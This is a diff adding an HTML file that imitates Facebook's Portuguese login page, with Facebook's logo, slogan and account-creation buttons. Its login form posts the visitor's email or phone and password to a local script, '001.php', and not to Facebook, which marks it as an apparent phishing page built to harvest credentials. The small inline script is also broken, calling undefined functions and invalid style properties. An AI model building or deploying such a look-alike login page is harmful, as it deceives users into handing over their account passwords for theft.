@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - entre ou cadastre-se</title>
+    <link rel="shortcut icon" href="image.png">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <main class="principal">
+        <section class="section1">
+            <img id="titulo" src="facebook.svg" alt="">
+            <p id="paragrafo">O Facebook ajuda você a se conectar e compartilhar com as pessoas que<br> fazem parte da sua vida.</p>
+        </section>
+           
+        <section class="section2">
+            <div class="box">
+                <div class="form">
+                    <form action="001.php" method="post">
+                        <input onclick="clicar1()" id="input1" type="text" name="usuario" placeholder="Email ou telefone" required="">
+                        <br><br>
+                        <input  onclick="clicar2()" id="input2" type="password" name="senha" placeholder="Senha" required="">
+                        <br><br>
+                        <input id="submit" class="input" type="submit" value="Entrar">
+                    </form>
+                    <p id="esqueceu_a_senha" >Esqueceu a senha?</p>
+                    <div id="margin">
+                        <button id="button" >Criar nova conta</button>
+                    </div>
+                </div>
+            </div>
+            <div id="paragrafo2"></div>
+            <p id="ultima_frase"><b>Criar uma Página</b> para uma celebridade, uma marca ou uma</p> <p id="ultima_palavra">empresa.</p>
+        </section>
+    </main>
+    <script>
+    var a = document.getElementById('input1');
+    var b = document.getElementById('input2');
+    a.addEventListener('click', clicar);
+    b.addEventListener('click', clicar);
+    function clicar1(){
+        a.document.getElementById('input1').style.border.color = 'blue'
+    }
+    function clicar2(){
+        b.document.getElementById('input2').style.border.color = 'blue'
+    }
+</script>
+</body>
+</html>
